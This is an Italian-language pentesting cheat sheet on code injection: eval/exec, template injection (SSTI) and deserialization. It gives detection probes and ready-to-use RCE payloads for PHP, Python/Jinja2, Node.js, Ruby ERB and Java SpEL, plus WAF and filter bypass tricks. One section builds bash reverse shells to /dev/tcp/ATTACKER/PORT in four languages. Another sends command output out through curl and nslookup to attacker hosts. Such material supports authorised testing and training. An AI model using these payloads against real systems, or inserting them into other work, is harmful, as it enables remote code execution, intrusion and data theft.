#Privesc_Linux

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Superfici di Attacco Comuni]]
    1. [[#Eval-_-Exec-Injection]]
    2. [[#Template-Injection-(SSTI)]]
    3. [[#Object-_-Deserialization-Injection]]
    4. [[#Code-vs-Command-Injection]]
- [[#Riconoscimento-e-Test-Rapidi]]
- [[#Esempi-Pratici-per-Stack]]
    1. [[#PHP]]
    2. [[#Python-(Flask-Jinja2)]]
    3. [[#Node.js-(Express-_-Template-Engines)]]
    4. [[#Ruby-(ERB-Rails)]]
    5. [[#Java-(SpEL-Thymeleaf-Spring)]]
- [[#Dalla-PoC-alla-Shell]]
- [[#Bypass-Comuni]]
- [[#Exfiltrazione-in-Modalità-Blind]]

---
---
---
### Introduzione
Per **Code Injection** si intende l’inserimento di **codice** (non solo comandi di sistema) in un interprete o motore di esecuzione dell’applicazione (PHP, Python, JS, Ruby, Java…), che poi lo **valuta** (_eval/exec_) con i privilegi del processo. È più ampia di una semplice _command injection_: qui l’obiettivo è arrivare a **esecuzione arbitraria** (RCE) sfruttando proprio il linguaggio/engine a runtime (eval, template engine, deserializzazione, ecc.).

---
### Superfici di Attacco Comuni
#### Eval / Exec Injection
Input utente passato a funzioni che **valutano codice**:

- PHP: `eval()`, `assert()` (con stringhe), `preg_replace('/e')` (legacy), `create_function()`.
- Python: `eval()`, `exec()`, `ast.literal_eval()` mal usato, interpreti REPL/dev console.
- JS/Node: `eval()`, `Function()`, `vm.runInNewContext()` con contesto non isolato.

---
#### Template Injection (SSTI)
Motori di template che **valutano espressioni**: Jinja2 (Python), Twig/Smarty (PHP), EJS/Pug/Handlebars (Node), ERB (Ruby), SpEL/Thymeleaf (Java). Un placeholder come `{{ user }}` che diventa `{{ user | payload }}` può portare ad accesso a oggetti sensibili e quindi RCE.

---
#### Object / Deserialization Injection
Dati non fidati passati a **deserializer** (PHP `unserialize`, Java/Kotlin/Jackson, Python `pickle`, Ruby `Marshal`) → esecuzione di **gadget** con magic methods (`__wakeup`, `__destruct`, ecc.) e RCE. (Collegata ma distinta dai template).

---
#### Code vs Command Injection
- **Code Injection**: esegui **codice del linguaggio** (p.es. `__import__('os')...` in Python).
- **Command Injection**: esegui **comandi di sistema** passando da shell (`;|&&` ecc.).  
    Spesso si parte da _code injection_ per poi chiamare API di sistema e ottenere una vera shell.

---
### Riconoscimento e Test Rapidi
- **Sonde matematiche** (SSTI):
    - `{{7*7}}` → `49` (Jinja2, Twig)
    - `${7*7}` o `*{7*7}` (SpEL/Thymeleaf)
- **Errore verboso con riferimenti al motore**: “Jinja2”, “Thymeleaf”, “Handlebars”, “ERB”, “SpEL”, “Pug”.
- **Risoluzione di attributi/oggetti**:
    - Python/Jinja2: `{{ ''.__class__.__mro__[1].__subclasses__() }}`
    - Node/Pug/Eval: `#{this.constructor.constructor('return process')()}`
- **Time-based**: usare funzioni `sleep`/loop per misurare risposta.
- **Out-of-band**: se non vedi output, tenta richieste DNS/HTTP verso un listener tuo.

---
### Esempi Pratici per Stack
#### PHP
- **Sonde**:
    `<?='7*7'?>            // se passa a eval, potrebbe valutare`
- **RCE (se eval/assert su input)**:
    `phpinfo(); system('id');`
- **Code → Command (proc_open preferito se system/exec disabilitati)**:
    `$des=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]]; $p=proc_open("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'",$des,$pipes);`
- **Template (Smarty/Twig)**:
    - Twig sandbox off: `{{ constant('PHP_OS') }}` → esc. graduale verso `system`.

---
#### Python (Flask / Jinja2)
- **Sonde**:
    `{{7*7}} -> 49`
- **Accesso a builtins → OS**:
    `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
    Alternativa:
    `{{ [].__class__.__mro__[1].__subclasses__()[...].__init__.__globals__['os'].popen('id').read() }}`
- **One-liner Python RCE**:
    `__import__('os').system('id') __import__('subprocess').check_output(['id'])`

---
#### Node.js (Express / Template Engines)
- **Eval/Function injection**:
    `this.constructor.constructor('return process')().mainModule   .require('child_process').execSync('id').toString()`
- **EJS**:
    `<%= global.process.mainModule.require('child_process').execSync('id') %>`
- **Pug**:
    `= this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')`

---
#### Ruby (ERB / Rails)
- **Sonde**:
    `<%= 7*7 %>  <!-- 49 -->`
- **RCE**:
    `<%= system('id') %> <%= %x(id) %>`

---
#### Java (SpEL / Thymeleaf / Spring)
- **Sonde**:
    `${7*7}  oppure  *{7*7}`
- **RCE con SpEL**:
    `${T(java.lang.Runtime).getRuntime().exec('id')}`
    (Spesso serve concatenare con `""` o usare `#this` per aggirare filtri).

---
### Dalla PoC alla Shell
- **PHP**: preferisci `proc_open`/`popen` se `system/exec` sono disabilitati.  
    Reverse shell bash:
    `proc_open("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$pipes);`
- **Python**:
    `__import__('os').system("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'")`
- **Node**:
    `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'")`
- **Java**:
    `T(java.lang.Runtime).getRuntime().exec('bash -c bash -i >& /dev/tcp/ATTACKER/PORT 0>&1')`

---
### Bypass Comuni
- **Parole chiave filtrate**: usare alias/dynamic import:
    - Python: `__import__('os')` invece di `import os`
    - Node: `this.constructor.constructor('...')`
- **Quote blacklist**: concatenazioni/encoding (`\x27`, `\uXXXX`, base64, join).
- **WAF**: URL-encoding/double encoding, separatori innocui, case-mixing.
- **Funzioni disabilitate**: in PHP usa `proc_open`/`mail`+`LD_PRELOAD` trick, in Python usa `subprocess` al posto di `os.system`, in Node `child_process`.

---
### Exfiltrazione in Modalità Blind
- **Time-based**: `sleep(5)` / loop pesanti per confermare l’esecuzione.
- **OOB DNS/HTTP**:
    - PHP/Python/Node: `curl http://ATTACKER/callback?x=$(id)`
    - DNS: `nslookup $(whoami).attacker.dns`
- **File drop**: scrivi un file in webroot e leggilo via HTTP.
